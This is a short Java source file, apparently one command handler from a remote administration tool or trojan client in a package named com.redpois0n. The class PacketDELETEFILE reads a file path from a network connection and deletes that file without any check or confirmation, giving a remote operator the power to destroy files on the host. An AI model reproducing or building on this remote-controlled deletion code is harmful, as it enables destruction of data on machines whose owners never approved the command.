package com.redpois0n.packets.in;

import java.io.File;

import com.redpois0n.Connection;


public class PacketDELETEFILE extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();
		File f = new File(file);
		if (f.exists()) {
			f.delete();
		}
		
	}

}
